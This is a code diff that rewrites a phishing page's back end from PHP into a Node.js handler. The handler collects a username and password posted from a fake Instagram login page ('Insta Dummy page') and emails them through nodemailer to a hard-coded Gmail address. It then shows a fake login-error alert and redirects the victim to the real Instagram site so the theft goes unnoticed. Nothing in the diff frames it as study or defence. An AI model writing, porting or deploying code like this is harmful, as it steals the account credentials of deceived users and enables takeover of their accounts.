@@ -1,27 +1,54 @@
-<?php
+import nodemailer from "nodemailer";
 
-// Variable settings
-$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
-$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
+export default async function handler(req, res) {
+  if (req.method !== "POST") {
+    return res.status(405).send("Method Not Allowed");
+  }
 
-$subject = "Someone Login ! Insta Dummy page";
-$to = "cy207551@gmail.com";
+  const username = req.body?.u_name || "";
+  const passcode = req.body?.pass || "";
 
-$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
+  const subject = "Someone Login ! Insta Dummy page";
+  const to = "cy207551@gmail.com";
 
-// Check input fields
-if (!empty($username) and !empty($passcode)) {
+  const txt = `Username: ${username}\r\nPassword: ${passcode}`;
 
-    mail($to, $subject, $txt);
-    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
-        window.location.replace('https://www.instagram.com');
-        </script>";
+  if (username && passcode) {
+    try {
+      const transporter = nodemailer.createTransport({
+        service: "gmail",
+        auth: {
+          user: process.env.MY_EMAIL,   // kendi gmail adresin
+          pass: process.env.MY_PASS,    // Gmail App Password
+        },
+      });
 
-} else {
+      await transporter.sendMail({
+        from: process.env.MY_EMAIL,
+        to,
+        subject,
+        text: txt,
+      });
 
-    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
+      // PHP’deki alert + redirect mantığı
+      res.setHeader("Content-Type", "text/html");
+      res.send(`
+        <script type="text/javascript">
+          alert('Error ! Unable to login ');
+          window.location.replace('https://www.instagram.com');
+        </script>
+      `);
+    } catch (err) {
+      console.error("Mail error:", err);
+      res.status(500).send("Mail send error");
+    }
+  } else {
+    res.setHeader("Content-Type", "text/html");
+    res.send(`
+      <script type="text/javascript">
+        alert('Please enter correct username or password. Try again ');
         window.history.go(-1);
-        </script>";
+      </script>
+    `);
+  }
 }
-?>
-
